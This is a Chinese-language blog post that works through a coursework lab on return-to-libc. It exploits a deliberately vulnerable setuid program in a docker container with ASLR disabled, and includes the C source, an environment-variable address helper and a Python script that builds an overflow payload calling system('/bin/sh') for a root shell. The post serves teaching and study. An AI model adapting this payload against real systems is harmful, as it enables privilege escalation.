---
layout:     post   				    # 使用的布局（不需要改）
title:      【网络攻防大作业】Return_to_libc实验报告 				# 标题 
subtitle:   Eutopia's Blog #副标题
date:       2024-1-1				# 时间
author:     Eutopia 						# 作者
header-img: img/post-bg-2.png 	#这篇文章标题背景图片
catalog: true 						# 是否归档
tags:								#标签
    - Pwn
    - Return to libc
---



## Return_to_libc WriteUp

### 1.环境搭建

- 修改flag为学号

- 构建docker镜像（运行`sudo ./build.sh`，注意`chmod +x`修改权限），连接不稳定，可能需要多次尝试

- 开启docker，禁用ASLR。

  ![image-20231231144427491](/img/posts/2024-1-1-Return_to_libc.assets/image-20231231144427491.png)

- 使用`netstat -antp`查看ssh服务状态

  ![image-20231231144545863](/img/posts/2024-1-1-Return_to_libc.assets/image-20231231144545863.png)

- 登录容器`ssh 0.0.0.0 -p 49153 -l seed`

### 2. 漏洞利用

运行镜像中vuln程序，vuln有setuid权限，因此可以尝试通过此来获取root shell。

![image-20231231145335514](/img/posts/2024-1-1-Return_to_libc.assets/image-20231231145335514.png)

查看vuln源代码：

```c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

#ifndef BUF_SIZE
#define BUF_SIZE 12
#endif

int bof(char *str)
{
    char buffer[BUF_SIZE];
    unsigned int *framep;

    // Copy ebp into framep
    asm("movl %%ebp, %0" : "=r" (framep));      

    /* print out information for experiment purpose */
    printf("Address of buffer[] inside bof():  0x%.8x\n", (unsigned)buffer);
    printf("Frame Pointer value inside bof():  0x%.8x\n", (unsigned)framep);

    strcpy(buffer, str);   

    return 1;
}

int main(int argc, char **argv)
{
   char input[1000];
   FILE *badfile;

   badfile = fopen("/home/seed/the_file", "r");
   int length = fread(input, sizeof(char), 1000, badfile);
   printf("Address of input[] inside main():  0x%x\n", (unsigned int) input);
   printf("Input size: %d\n", length);

   bof(input);

   printf("(^_^)(^_^) Returned Properly (^_^)(^_^)\n");
   return 1;
}
```

发现输入`input`长度可以达到1000，可以造成栈溢出攻击获取root shell。

![image-20231231145600873](/img/posts/2024-1-1-Return_to_libc.assets/image-20231231145600873.png)

另外发现docker镜像中已将zsh链接到sh，因此只需构造环境变量`/bin/sh`，使用`system('/bin/sh')`获取shell即可。`system`，`exit`地址如下。

![image-20231231152925920](/img/posts/2024-1-1-Return_to_libc.assets/image-20231231152925920.png)

根据vuln返回信息可以获取到input、buffer地址以及栈帧基址。

```shell
seed /home/seed % vuln
Address of input[] inside main():  0xffffd8d0
Input size: 66
Address of buffer[] inside bof():  0xffffd7e4
Frame Pointer value inside bof():  0xffffd8b8
```



可以计算出从buffer需要溢出`0xffffd8b8-0xffffd7e4 = 212`个字节可以溢出到ebp。然后ebp返回地址上填入system地址，并添加参数和exit返回地址即可。

参数`/bin/sh`尝试使用环境变量实现。

![image-20231231153450024](/img/posts/2024-1-1-Return_to_libc.assets/image-20231231153450024.png)

构造脚本`genv.c`获取环境变量地址，

```c
#include<stdlib.h>
#include<stdio.h>

void main(){
char* shell = getenv("MYSHELL");
if (shell)
  printf("%x\n", (unsigned int)shell);
}
```

编译genv并上传，获取到`/bin/sh`地址`0xffffdfd5`。

```shell
gcc -m32 genv.c -o genv
scp -P 49153 ./genv seed@0.0.0.0:/home/seed
```

![image-20231231153928103](/img/posts/2024-1-1-Return_to_libc.assets/image-20231231153928103.png)

构造python脚本，并上传

```python
#!/usr/bin/env python3
import sys

# Fill content with non-zero values
content = bytearray(0xaa for i in range(300))

input_addr	= 0xffffd8c0
buffer_addr	= 0xffffd7d4
ebp_addr	= 0xffffd8a8 
system_addr	= 0xf7e19360   # The address of system()
exit_addr	= 0xf7e0bec0
sh_addr = 0xffffdfd2       # The address of "/bin/sh"

Y = ebp_addr - buffer_addr + 4
content[Y:Y+4] = (system_addr).to_bytes(4,byteorder='little')

X = Y + 8
content[X:X+4] = (sh_addr).to_bytes(4,byteorder='little')

Z = Y + 4
content[Z:Z+4] = (exit_addr).to_bytes(4,byteorder='little')

# Save content to a file
with open("the_file", "wb") as f:
  f.write(content)
```

```shell
scp -P 49153 ./exp.py seed@0.0.0.0:/home/seed
```

修改文件权限并执行：

```shell
chmod 755 exp.py
chmod 755 the_file
python3 exp.py
```

其中发现"/bin/sh"环境变量存在偏移0x3，对exp.py稍作修改后重新运行，成功获取到root shell，获取到flag。

![image-20231231154624159](/img/posts/2024-1-1-Return_to_libc.assets/image-20231231154624159.png)